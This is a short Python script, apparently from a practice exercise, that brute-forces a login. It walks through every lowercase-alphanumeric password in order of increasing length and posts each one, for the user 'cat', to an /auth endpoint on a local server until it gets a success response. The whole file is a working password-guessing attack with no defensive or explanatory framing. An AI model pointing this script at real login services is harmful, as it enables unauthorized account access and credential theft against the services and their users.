import requests


alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
# alphabet = '0123456789abcdef'
base = len(alphabet)

i = 0
length = 0

while True:
    password = ''
    temp = i
    while temp > 0:
        c = temp // base
        r = temp % base
        password += alphabet[r]
        temp = c

    if len(password) < length:
        zeros_count = length - len(password)
        password = alphabet[0] * zeros_count + password

    print(length, i, password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break

    if password.count(alphabet[-1]) == length:
        length += 1
        i = 0
    else:
        i += 1
